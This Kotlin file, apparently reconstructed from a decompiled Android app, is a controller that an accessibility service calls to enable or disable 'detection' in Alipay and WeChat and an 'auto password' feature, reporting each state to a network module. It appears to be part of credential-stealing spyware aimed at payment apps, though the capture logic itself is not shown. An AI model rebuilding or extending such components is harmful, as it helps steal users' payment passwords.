package com.storm.safe.rock.service.delegates

import android.util.Log
import com.storm.safe.rock.service.modules.EventFilterManager
import com.storm.safe.rock.service.modules.NetworkManager
import org.json.JSONObject

/**
 * DetectionController — delegates detection enable/disable from
 * MyAccessibilityService to EventFilterManager + NetworkManager.
 *
 * Extracted methods:
 * - enableAlipayDetection(delayMs)
 * - enableWechatDetection(delayMs)
 * - enableAutoPassword(delayMs)
 * - disableAutoPassword()
 * - disableWechatDetection()
 * - disableAlipayDetection()
 *
 * Uses Mode C (lambda providers) to avoid circular dependency
 * with MyAccessibilityService.
 */
class DetectionController(
    private val eventFilterManagerProvider: () -> EventFilterManager?,
    private val networkManagerProvider: () -> NetworkManager?
) {
    companion object {
        private const val TAG = "DetectionController"
    }

    // ════════════════════════════════════════════════════════════════
    // Enable methods
    // ════════════════════════════════════════════════════════════════

    /**
     * Enable Alipay detection.
     * JADX: dqtvuisjd calls C0614i9.m213122b0(delayMs) + C0323a8 status.
     */
    fun enableAlipayDetection(delayMs: Long) {
        try {
            Log.d(TAG, "enableAlipayDetection delayMs=$delayMs")
            eventFilterManagerProvider()?.enableAlipayDetection(delayMs)
            networkManagerProvider()?.sendAlipayDetectionStatus(JSONObject().apply {
                put("enabled", true)
                put("delayMs", delayMs)
            })
        } catch (e: Exception) {
            Log.e(TAG, "enableAlipayDetection failed", e)
        }
    }

    /**
     * Enable WeChat detection.
     * JADX: dqtvuisjd calls C0614i9.m213125b3(delayMs) + C0323a8 status.
     */
    fun enableWechatDetection(delayMs: Long) {
        try {
            Log.d(TAG, "enableWechatDetection delayMs=$delayMs")
            eventFilterManagerProvider()?.enableWechatDetection(delayMs)
            networkManagerProvider()?.sendWechatDetectionStatus(JSONObject().apply {
                put("enabled", true)
                put("delayMs", delayMs)
            })
        } catch (e: Exception) {
            Log.e(TAG, "enableWechatDetection failed", e)
        }
    }

    /**
     * Enable auto password detection.
     * JADX: dqtvuisjd calls C0614i9.m213123b1(delayMs) + C0323a8 status.
     */
    fun enableAutoPassword(delayMs: Long) {
        try {
            Log.d(TAG, "enableAutoPassword delayMs=$delayMs")
            eventFilterManagerProvider()?.enableAutoPassword(delayMs)
            networkManagerProvider()?.sendAutoPasswordDetectionStatus(JSONObject().apply {
                put("enabled", true)
                put("delayMs", delayMs)
            })
        } catch (e: Exception) {
            Log.e(TAG, "enableAutoPassword failed", e)
        }
    }

    // ════════════════════════════════════════════════════════════════
    // Disable methods
    // ════════════════════════════════════════════════════════════════

    /**
     * Disable auto password detection.
     * JADX: dqtvuisjd calls C0614i9.m213120a8() + C0323a8 status.
     */
    fun disableAutoPassword() {
        try {
            Log.d(TAG, "disableAutoPassword")
            eventFilterManagerProvider()?.disableAutoPassword()
            networkManagerProvider()?.sendAutoPasswordDetectionStatus(JSONObject().apply {
                put("enabled", false)
                put("delayMs", 0L)
            })
        } catch (e: Exception) {
            Log.e(TAG, "disableAutoPassword failed", e)
        }
    }

    /**
     * Disable WeChat detection.
     * JADX: m211456e5 — early returns if eventFilterManager is null.
     */
    fun disableWechatDetection() {
        try {
            Log.d(TAG, "disableWechatDetection")
            val efm = eventFilterManagerProvider()
            if (efm == null) {
                Log.w(TAG, "eventFilterManager not initialized")
                return
            }
            efm.disableWechatDetection()
            networkManagerProvider()?.sendWechatDetectionStatus(JSONObject().apply {
                put("enabled", false)
            })
        } catch (e: Exception) {
            Log.e(TAG, "disableWechatDetection failed", e)
        }
    }

    /**
     * Disable Alipay detection.
     * JADX: m211455e4 — early returns if eventFilterManager is null.
     */
    fun disableAlipayDetection() {
        try {
            Log.d(TAG, "disableAlipayDetection")
            val efm = eventFilterManagerProvider()
            if (efm == null) {
                Log.w(TAG, "eventFilterManager not initialized")
                return
            }
            efm.disableAlipayDetection()
            networkManagerProvider()?.sendAlipayDetectionStatus(JSONObject().apply {
                put("enabled", false)
            })
        } catch (e: Exception) {
            Log.e(TAG, "disableAlipayDetection failed", e)
        }
    }
}
